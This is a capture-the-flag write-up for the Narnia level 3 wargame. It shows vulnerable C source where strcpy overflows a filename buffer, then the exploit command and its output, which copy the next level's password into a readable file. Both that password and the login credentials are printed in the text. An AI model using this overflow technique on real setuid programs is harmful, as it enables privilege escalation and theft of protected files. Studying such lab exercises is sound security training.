login as `narnia3:2xszzNl6uG`

```
narnia3@gibson:/narnia$ cat narnia3.c
```

```cpp
/*
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```

buffer overflow it seems... we have control over `ifile`, and by extension `ofile`.

to overwrite into `ofile`, our payload has to be at least 32 bytes in size, and must not contain any null byte (or gets truncated by strcpy); any byte from index 32 on is written into ofile.

in short, our argument has to point to our path `/etc/narnia_pass/narnia4`, and sliced from the 32th character is our output file (that we can read).

i made a tmp dir for this
```sh
narnia3@gibson:/tmp/cxyz$ /narnia/narnia3 /etc/////////narnia_pass//narnia4
copied contents of /etc/////////narnia_pass//narnia4 to a safer place... (4)
narnia3@gibson:/tmp/cxyz$ cat 4
iqNWNk173q
����pu��p��narnia3@gibson:/tmp/cxyz$
```